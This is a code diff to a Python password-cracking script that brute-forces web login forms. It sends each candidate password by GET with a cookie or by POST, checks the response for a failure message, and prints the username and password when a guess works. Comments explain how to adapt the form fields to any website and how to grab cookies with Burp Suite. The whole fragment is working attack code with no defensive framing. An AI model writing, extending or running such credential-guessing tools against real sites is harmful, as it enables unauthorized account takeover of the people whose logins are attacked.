@@ -14,9 +14,16 @@ def cracking(username, url):
         print(colored(('Trying : ' + Password), 'red'))
         data = {'username': username, 'password': Password, 'Login' : 'submit'} #This the line you need to change for every website according to their HTML Code req.
         if cookie_value != '':
+            #In this line we Use "GET Method" of the WebPage to get the result of the request.
             response = request.get(url, params = {'username': username, 'password': Password, 'Login' : 'Login'}, cookies = {'Cookie' : cookie_value})
             #again the above line of code you need to change by seeing the HTMl code of the website you can see the source code by pressing "ctrl + u"
             #and for the cookie part you need to use the Burp Suite to See and chcek the Cookie and their parameter.
+        else:
+            response = request.post(url, data=data)
+        #The above line we use the 'POST Method' oF the WEB page to send the request.
+        if login_failed_message in response.content.decode():
+            pass
+
         else:
             print(colored(('[+] Found Username ==> ' + username), 'green'))
             print(colored(('[+] Found Password ==> ' + Password), 'green'))
